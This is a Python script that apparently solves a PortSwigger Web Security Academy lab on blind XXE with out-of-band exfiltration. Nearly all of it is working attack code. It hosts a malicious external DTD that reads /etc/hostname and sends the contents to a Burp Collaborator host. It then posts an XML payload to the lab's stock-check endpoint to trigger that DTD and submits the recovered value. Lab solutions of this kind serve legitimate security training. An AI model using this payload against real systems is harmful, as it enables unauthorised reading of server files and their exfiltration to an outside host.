import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
# author: 0xyf
# with collaborator


class XXE5:
    def __init__(self):
        self.lab_id = "0a4a00aa04abe544822d60b00021004e"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"
        self.collab_url = f"http://7w4ihhuy5h5455zbzwn2uz49z05wtqxem.oastify.com"
        self.get_exploit_srv_url()

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def get_submit_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        submit_path = soup.find("button", id="submitSolution").get("path")
        self.submit_url = f"{self.url}{submit_path}"

    def store_dtd(self):

        payload = f"""<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{self.collab_url}/?x=%file;'>">%eval;%exfiltrate;"""
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def xxe(self):
        xxe_payload_1 = f"""<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{self.exploit_srv_url}/exploit"> %xxe; ]>"""
        xxe_payload_2 = "%xxe;"
        data = f"""<?xml version="1.0" encoding="UTF-8"?>{xxe_payload_1}<stockCheck><productId>{xxe_payload_2}</productId><storeId>1</storeId></stockCheck>"""
        print(f"[+] payload: {data}")
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def submit_file_contents(self):
        self.get_submit_url()
        print("[+] submitting key")
        data = {"answer": input("Enter file contents: ")}
        r = requests.post(
            self.submit_url,
            data=data,
            proxies=self.proxies,
            verify=False,
        )

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.store_dtd()
        self.xxe()
        self.submit_file_contents()
        self.check_solved()


def main():
    XXE5().solve()


if __name__ == "__main__":
    main()
